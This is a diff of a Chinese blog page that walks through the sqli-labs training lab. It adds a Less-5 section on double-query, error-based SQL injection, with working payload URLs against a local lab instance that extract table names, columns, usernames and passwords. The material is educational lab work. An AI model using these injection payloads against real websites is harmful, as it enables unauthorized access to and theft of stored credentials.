@@ -28,7 +28,12 @@
 <meta property="og:image" content="http://yoursite.com/2019/06/03/sqli-labs通关详解/11.png">
 <meta property="og:image" content="http://yoursite.com/2019/06/03/sqli-labs通关详解/blog/source/_posts/sqli-labs通关详解/12.png">
 <meta property="og:image" content="http://yoursite.com/2019/06/03/sqli-labs通关详解/13.png">
-<meta property="og:updated_time" content="2019-06-09T08:01:09.880Z">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/sqli-labs通关详解/14.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/sqli-labs通关详解/15.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/sqli-labs通关详解/16.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/sqli-labs通关详解/17.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/sqli-labs通关详解/18.jpg">
+<meta property="og:updated_time" content="2019-06-12T12:52:08.404Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqli-labs通关详解">
 <meta name="twitter:image" content="http://yoursite.com/2019/06/03/sqli-labs通关详解/title.jpg">
@@ -254,7 +259,39 @@
 <p><img src="/2019/06/03/sqli-labs通关详解/13.png" alt></p>
 <p>接下来就可以进行常规操作了，就可以获取数据了。</p>
 <h3 id="Less-4-双引号变形注入-："><a href="#Less-4-双引号变形注入-：" class="headerlink" title="Less-4(双引号变形注入)："></a>Less-4(双引号变形注入)：</h3><p>先找到注入点，<code>首先输入单引号</code>、发现没有报错提醒，那我们就输入双引号，发现出现了和上一题一样的报错提醒，那就是和上一题一样的步骤就行了。</p>
-<h3 id="Less-5-报错注入-："><a href="#Less-5-报错注入-：" class="headerlink" title="Less-5(报错注入)："></a>Less-5(报错注入)：</h3>
+<h3 id="Less-5-双查询注入注入-："><a href="#Less-5-双查询注入注入-：" class="headerlink" title="Less-5(双查询注入注入)："></a>Less-5(双查询注入注入)：</h3><p>这道题可以用双查询注入，我们来一起学习一下双查询注入。</p>
+<p>双注入的原理，简单一句话原理就是有研究人员发现，<strong>当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。</strong></p>
+<p>加黑字体是全文中最总要的一句话，一定要好好记住！！</p>
+<p>这种方法方法通常用于注入的时候没有返回位。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">函数说明：</span><br><span class="line">rand()是一个生成随机数的函数，他会返回0到1之间到一个值。</span><br><span class="line">floor()是取整函数了，童鞋们应该都很熟悉了。</span><br><span class="line">count()是一个聚合函数，用户返回符合条件的记录数量。</span><br></pre></td></tr></table></figure>
+<p>大概说一下它固定的格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat_ws(&apos;:&apos;,([子查询],floor(rand()*2))) as a form [table_name] group by a;</span><br></pre></td></tr></table></figure>
+<p>嘿咻嘿咻，我在研究双注入的时候看到了一篇文章对我的帮助特别大，特此奉献出地址  <a href="http://www.91ri.org/7636.html" target="_blank" rel="noopener">http://www.91ri.org/7636.html</a></p>
+<p>主要就是说，通过报错的形式查出你所想要查的东西，至于为何会是这种固定的格式呢因为 <strong><em>当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来</em></strong>，把它分组，清晰明了</p>
+<p>不信请看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat((select version()),floor(rand()*2))  from information_schema.tables;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/06/03/sqli-labs通关详解/14.png" alt></p>
+<p>这么多的数据，我们分组来看看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat((select version()),floor(rand()*2)) as a from information_schema.tables group by a;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/06/03/sqli-labs通关详解/15.png" alt></p>
+<p>这样就清晰明了很多了，我们通过报错来获取我们想要的信息。</p>
+<p>这是在navicat里面进行的查询。</p>
+<p><img src="/2019/06/03/sqli-labs通关详解/16.png" alt></p>
+<p>接下来，我们就进入正题，来写一下这道题是如何做的？</p>
+<p>发现输入？id=1，会出现，you are in…….</p>
+<p>输入 ？id=1’ 会报错，那么是因为把1‘带入了sql语句中进行了查询，格式不对报的错。就说明没有回显，我们就用双查询注入做，其实还可以用其他的报错注入做，或者盲注。</p>
+<p>查询数据库版本，数据库名字</p>
+<p><img src="/2019/06/03/sqli-labs通关详解/17.jpg" alt></p>
+<p><img src="/2019/06/03/sqli-labs通关详解/18.jpg" alt></p>
+<p>然后和往常一样查询表名，列名，从而猜解字段名。就不一一的写了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查询有几张表:</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-5/?id=-1&apos; union select 1,count(*),concat((select count(table_name) from information_schema.tables where table_schema=&apos;security&apos; ),&apos;~~&apos;,floor(rand()*2)) as a from  information_schema.tables group by a --+</span><br><span class="line">查询表名:</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-5/?id=-1&apos; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),&apos;~~&apos;,floor(rand()*2)) as a from  information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
+<p>发现有四张表：emails,referers,uagents,users,</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查users表中的数据</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-5/?id=-1&apos; union select 1,count(*),concat((select count(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 0,1),&apos;~~&apos;,floor(rand()*2)) as a from  information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
+<p>有3个字段：id,username,password</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查users表中的用户名：</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-5/?id=-1&apos; union select 1,count(*),concat((select username from users limit 0,1),&apos;~~&apos;,floor(rand()*2)) as a from  information_schema.tables group by a --+</span><br><span class="line">查每个用户民对应的密码：</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-5/?id=-1&apos; union select 1,count(*),concat((select password from users where username=&apos;Dumb&apos;),&apos;~~&apos;,floor(rand()*2)) as a from  information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
+<p><font size="6" color="red">总结</font>:</p>
+<p>恰好也发现了这种注入方式中子查询若使用group_concat()函数无法触发报错!</p>
+
       
 
       
@@ -417,7 +454,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入的知识点："><span class="toc-number">1.1.</span> <span class="toc-text">sql注入的知识点：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-1-单引号注入-："><span class="toc-number">1.1.1.</span> <span class="toc-text">Less-1(单引号注入)：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-2-整形注入-："><span class="toc-number">1.1.2.</span> <span class="toc-text">Less-2(整形注入)：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-3-单引号变形注入-："><span class="toc-number">1.1.3.</span> <span class="toc-text">Less-3(单引号变形注入)：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-4-双引号变形注入-："><span class="toc-number">1.1.4.</span> <span class="toc-text">Less-4(双引号变形注入)：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-5-报错注入-："><span class="toc-number">1.1.5.</span> <span class="toc-text">Less-5(报错注入)：</span></a></li></ol></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入的知识点："><span class="toc-number">1.1.</span> <span class="toc-text">sql注入的知识点：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-1-单引号注入-："><span class="toc-number">1.1.1.</span> <span class="toc-text">Less-1(单引号注入)：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-2-整形注入-："><span class="toc-number">1.1.2.</span> <span class="toc-text">Less-2(整形注入)：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-3-单引号变形注入-："><span class="toc-number">1.1.3.</span> <span class="toc-text">Less-3(单引号变形注入)：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-4-双引号变形注入-："><span class="toc-number">1.1.4.</span> <span class="toc-text">Less-4(双引号变形注入)：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-5-双查询注入注入-："><span class="toc-number">1.1.5.</span> <span class="toc-text">Less-5(双查询注入注入)：</span></a></li></ol></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -537,11 +574,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
+                <a href="javascript:void(0)" class="js-tag color1">web安全</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">web安全</a>
+                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
               </li>
             
             <div class="clearfix"></div>
